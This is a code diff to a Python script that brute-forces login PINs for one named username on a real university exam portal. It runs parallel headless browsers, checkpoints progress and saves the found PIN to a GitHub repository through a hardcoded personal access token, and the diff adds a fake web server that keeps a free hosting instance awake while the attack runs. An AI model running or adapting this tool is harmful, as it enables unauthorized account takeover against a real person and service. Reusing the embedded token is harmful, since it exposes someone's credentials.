@@ -15,6 +15,7 @@ import requests as req_lib
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
+from http.server import HTTPServer, BaseHTTPRequestHandler
 
 # ── Config ────────────────────────────────────────────────────
 TARGET_URL        = os.environ.get("TARGET_URL", "https://makaut1.ucanapply.com/smartexam/public/")
@@ -22,7 +23,7 @@ USERNAME          = os.environ.get("USERNAME",   "11900122027")
 GITHUB_TOKEN      = os.environ.get("GITHUB_TOKEN", "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")
 GITHUB_REPO       = os.environ.get("GITHUB_REPO", "abcdstore24-oss/My_Repo")
 GITHUB_FILE       = "checkpoint.json"
-NUM_WORKERS       = 8
+NUM_WORKERS       = 10
 DELAY             = 0.3
 HEADLESS          = True
 TOTAL_PINS        = 100_000_000
@@ -42,7 +43,27 @@ found_event  = threading.Event()
 found_result = {}
 print_lock   = threading.Lock()
 
-# ── GitHub checkpoint ─────────────────────────────────────────
+
+# ── Fake web server (keeps Render free tier awake) ────────────
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        status = "running"
+        if "pin" in found_result:
+            status = f"FOUND: {found_result['pin']}"
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(status.encode())
+
+    def log_message(self, *args):
+        pass  # suppress server logs
+
+def start_web_server():
+    port = int(os.environ.get("PORT", 8080))
+    server = HTTPServer(("0.0.0.0", port), Handler)
+    server.serve_forever()
+
+
+# ── GitHub helpers ────────────────────────────────────────────
 def gh_headers():
     return {
         "Authorization": f"token {GITHUB_TOKEN}",
@@ -110,13 +131,14 @@ def github_save_result(pin, sha=None):
         }, indent=2).encode()).decode()
         url   = f"https://api.github.com/repos/{GITHUB_REPO}/contents/result.json"
         check = req_lib.get(url, headers=gh_headers(), timeout=10)
-        body  = {"message": f"FOUND {pin}", "content": content}
+        body  = {"message": f"FOUND PIN = {pin}", "content": content}
         if check.status_code == 200:
             body["sha"] = check.json()["sha"]
         req_lib.put(url, headers=gh_headers(), json=body, timeout=10)
         print("\n  [GitHub] result.json saved to repo ✓")
     except Exception as e:
         print(f"\n  [GitHub] Result error: {e}")
+
 
 # ── Success check ─────────────────────────────────────────────
 def check_success(page) -> bool:
@@ -130,6 +152,7 @@ def check_success(page) -> bool:
         pass
     return False
 
+
 # ── Browser alive ─────────────────────────────────────────────
 def is_browser_alive(page) -> bool:
     try:
@@ -137,6 +160,7 @@ def is_browser_alive(page) -> bool:
         return True
     except Exception:
         return False
+
 
 # ── Modal open ────────────────────────────────────────────────
 def open_modal(page, worker_id: int) -> bool:
@@ -166,6 +190,7 @@ def open_modal(page, worker_id: int) -> bool:
         with print_lock:
             print(f"\n  [W{worker_id}] Modal error: {e}")
         return False
+
 
 # ── Worker ────────────────────────────────────────────────────
 def worker(worker_id: int, chunk_start: int, chunk_end: int):
@@ -274,6 +299,7 @@ def worker(worker_id: int, chunk_start: int, chunk_end: int):
 
     return None
 
+
 # ── Main ──────────────────────────────────────────────────────
 def split_chunks(total, n):
     size = total // n
@@ -282,13 +308,18 @@ def split_chunks(total, n):
 def run():
     print()
     print("=" * 58)
-    print("  BRUTE FORCE — Render + GitHub Checkpoint")
+    print("  BRUTE FORCE — GitHub Checkpoint")
     print("=" * 58)
     print(f"  Target   : {TARGET_URL}")
     print(f"  Username : {USERNAME}")
     print(f"  Range    : 0000 – {TOTAL_PINS-1:04d}")
+    print(f"  Headless : {HEADLESS}")
     print(f"  Started  : {datetime.now().strftime('%H:%M:%S')}")
     print("=" * 58)
+
+    # Start fake web server for Render free tier
+    threading.Thread(target=start_web_server, daemon=True).start()
+    print("  [Web] Server started (Render keepalive)")
 
     chunks = split_chunks(TOTAL_PINS, NUM_WORKERS)
 
